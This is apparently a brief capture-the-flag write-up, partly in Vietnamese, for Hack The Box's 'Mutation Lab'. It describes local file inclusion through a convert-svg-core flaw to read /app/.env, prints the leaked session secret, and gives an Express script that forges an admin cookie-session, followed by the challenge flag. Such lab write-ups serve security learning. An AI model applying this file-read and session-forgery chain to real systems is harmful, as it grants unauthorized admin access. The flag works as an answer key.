# Mutation Lab

[Vul](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785) ở package `convert-svg-core` của serrer.


LFI với path: `/app/index.js` và `/app/.env` lấy thông tin về file index và environment variable.

`SESSION_SECRET_KEY=5921719c3037662e94250307ec5ed1db`

sau đó forge the session cookie và lấy flag

script:
```js
const express = require('express');
const session = require('cookie-session');

const app = express();
const cookieParser = require('cookie-parser');

app.use(express.json({ limit: '2mb' }))
app.use(cookieParser())

app.use(session({
    name: 'session',
    keys: (['5921719c3037662e94250307ec5ed1db'])
}))

app.get('/', (req, res) => {
    req.session = { "username": "admin" }
    res.send('haha')
})

app.listen(3333)
```

**HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}**

